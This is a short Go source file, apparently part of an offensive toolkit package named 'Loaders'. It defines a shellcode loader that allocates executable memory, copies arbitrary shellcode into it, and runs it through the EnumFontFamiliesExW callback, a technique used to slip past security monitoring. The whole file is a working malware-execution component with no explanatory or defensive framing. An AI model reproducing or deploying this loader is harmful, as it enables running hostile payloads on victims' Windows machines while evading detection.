package Loaders

import (
	"syscall"
	"unsafe"
)

var (
	if1 [0]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32            = syscall.MustLoadDLL("kernel32.dll")
	ntdll               = syscall.MustLoadDLL("ntdll.dll")
	Gdi32               = syscall.MustLoadDLL("Gdi32.dll")
	User32              = syscall.MustLoadDLL("User32.dll")
	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	EnumFontFamiliesExW = Gdi32.MustFindProc("EnumFontFamiliesExW")
	GetDC               = User32.MustFindProc("GetDC")
	RtlMoveMemory       = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	dc, _, _ := GetDC.Call(0)
	EnumFontFamiliesExW.Call(dc, (uintptr)(unsafe.Pointer(&dc)), addr, 0, 0)
}
